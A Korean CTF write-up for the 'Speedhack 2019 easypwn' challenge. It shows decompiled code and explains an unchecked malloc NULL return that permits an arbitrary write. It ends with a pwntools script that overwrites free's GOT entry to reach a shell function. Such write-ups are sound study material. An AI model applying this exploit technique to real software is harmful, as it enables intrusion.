# Speedhack 2019 easypwn

#### mitigation

- Partial RELRO
- Canary 
- NX enabled
- No PIE


#### add 함수

```c
printf("Size: ");
__isoc99_scanf("%d", &size);
v0 = i;
buf[v0] = malloc(size);
printf("Overflow idx: ");
__isoc99_scanf("%ld", &idx);
printf("Data: ");
__isoc99_scanf("%ld, &data);
if ( data > 0x500000 )
    exit(0);
*(buf[i] + idx) = data;
return 0LL;
```

1. 원하는 크기를 입력하고, 힙 할당을 하여 전역 변수 `buf`에 삽임함
2. `idx` 를 입력함
3. 원하는 값을 쓸 수 있게 data를 입력받되, data는 `0x500000` 보다 작아야함
4. 포인터로부터 `idx` 만큼 떨어진 곳에 데이터를 작성함


#### delete 함수

```c
printf("idx: ");
__isoc99_scanf("%d", &v1);
if ( v1 > 9 )
    exit(0);
free(buf[v1]);
result = buf;
buf[v1] = 0LL;
return result;
```

할당한 힙을 해제하고 포인터를 초기화함


#### 취약점

1. `idx`를 기준으로 오버플로우 시키는 방법도 존재하겠지만 `malloc` 포인터에 대한 검증이 존재하지 않기 때문에 NULL을 리턴할 수 있음
2. NULL을 리턴하게 되면 아래와 같은 코드에서 `idx`가 주소를 가리키게 할 수 있음

```cpp
*(buf[i] + idx) = data; // *(0 + idx) = data;
```

이를 이용하여 `free` 혹은 다른 함수의 `GOT`를 주어진 `giveshell` 함수 주소로 덮게 되면 쉘을 획득할 수 있음



#### 레퍼런스 익스플로잇

```python
from pwn import *

def add(size, idx, data):
	print p.sendlineafter(">", "1")
	print p.sendlineafter(":", str(size))
	print p.sendlineafter(":", str(idx))
	print p.sendlineafter(":", str(data))

def delete(idx):
	print p.sendlineafter(">", "2")
	print p.sendlineafter(":", str(idx))

p = remote("0",31337)

add(-1, 0x601018, 0x000000000040083a)

delete(0)

p.interactive()
```
